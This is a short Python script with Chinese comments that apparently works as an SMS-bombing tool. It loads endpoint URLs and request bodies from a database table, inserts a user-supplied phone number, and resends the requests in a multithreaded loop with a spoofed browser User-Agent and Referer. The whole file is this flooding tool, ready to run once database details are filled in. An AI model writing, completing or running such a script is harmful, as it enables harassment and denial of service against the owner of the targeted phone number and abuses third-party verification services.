import mysql.connector  # 导入 mysql 库
import requests  # 导入 requests 库
from concurrent.futures import ThreadPoolExecutor  # 导入并发库
import random  # 导入 random 库
import time  # 导入 time 库

# 获取用户输入的电话号码
user_input = input("请输入电话号码: ")
# 输入循环次数
circulate = int(input("请输入循环次数："))
# 输入线程
thread1 = int(input("请输入线程："))
# 连接到数据库
conn = mysql.connector.connect(
    host="",
    user="",
    password="",
    database=""
)

# 创建游标来执行查询
cur = conn.cursor()

# 执行查询，获取数据，将***替换为表名
cur.execute("SELECT * FROM ***")

# 获取所有行
rows = cur.fetchall()

# 创建线程池
executor = ThreadPoolExecutor(max_workers=thread1)
i = 0
while i < circulate:
    i = i + 1
    print("第"+str(i)+"次循环")
    # 定义发送请求的函数
    def send_request(url, post_data, cookie=None, header=None):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Referer": "https://www.baidu.com",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Accept": "application/json",
            }
            if cookie:
                headers["cookie"] = cookie
            if header:
                headers.update(header)
            if post_data:
                response = requests.post(url, json=post_data, headers=headers)
            else:
                response = requests.get(url, headers=headers)
            if response.status_code != 200:
                return
            print(response.status_code)
        except Exception as e:
            print(f"访问 {url} 时发生错误: {e}")


    # 遍历行
    for row in rows:
        url = row[1]
        post_data = row[2]
        url = url.replace("[phone]", user_input)
        if post_data:
            # 将用户输入的电话号码替换掉 post_data 中的 [phone]
            post_data = post_data.replace("[phone]", user_input)
        # 提交请求到线程池中
        executor.submit(send_request, url, post_data)

# 关闭连接
cur.close()
conn.close()
